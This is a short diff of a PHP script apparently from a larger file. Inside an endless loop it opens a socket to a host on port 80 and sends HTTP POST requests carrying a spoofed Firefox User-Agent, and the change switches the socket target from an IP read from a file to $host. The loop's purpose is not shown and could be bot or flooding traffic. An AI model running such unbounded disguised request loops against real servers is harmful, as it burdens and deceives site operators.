@@ -12,7 +12,7 @@ while(1)
 	{
 		$ip = file_get_contents($filename);
 	}
-	$socket = fsockopen($ip, 80, $errno, $errstr, 15);
+	$socket = fsockopen($host, 80, $errno, $errstr, 15);
 	$http = "POST {$path} HTTP/1.1\r\n";
 	$http .= "Host: {$host}\r\n";
 	$http .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\n";
